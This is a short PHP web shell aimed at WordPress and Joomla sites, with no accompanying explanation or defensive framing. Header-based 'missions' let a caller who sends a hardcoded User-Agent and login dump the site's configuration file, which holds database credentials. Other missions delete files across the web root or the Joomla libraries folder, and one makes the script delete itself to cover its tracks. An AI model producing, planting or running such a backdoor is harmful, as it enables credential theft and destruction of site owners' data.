<?php
$ROOT=$_SERVER['DOCUMENT_ROOT'];
$DIR=scandir($ROOT);

// getting headers from user
$headers=getallheaders();
$UG=$headers['User-Agent'];
$LOGIN=$headers['login'];
$CMS=$headers['cms'];
$MISSION=$headers['mission'];


switch ($MISSION) {
	case 'getconfig':
		// For wordPress start
		if ($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp') {
			$conf=readfile('wp-config.php');
			echo ($conf);
		}
		// For WordPress end
		
		// For Joomla start
		if ($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='joomla') {
			$conf=readfile($ROOT.'/configuration.php');
			echo ($conf);
		}
		// For Joomla end
		break;
	case 'destroy':
		//for wordPress start
		if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp'){
			foreach ($DIR as $key) {
				if (!is_dir($key)) {
					unlink($ROOT.'/'.$key);
				}
			}
		}
		// For WordPress end

		// For Joomla start
		if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='joomla'){
			$dir=scandir("$ROOT/libraries");
			foreach ($dir as $file) {
				if (is_file($file)) {
					unlink("$ROOT/libraries/$file");
				}
			}
		}	
		// For Joomla end
		break;
	case 'delete':
		unlink(__FILE__);
		break;
	default:
		echo ("string");
}?>
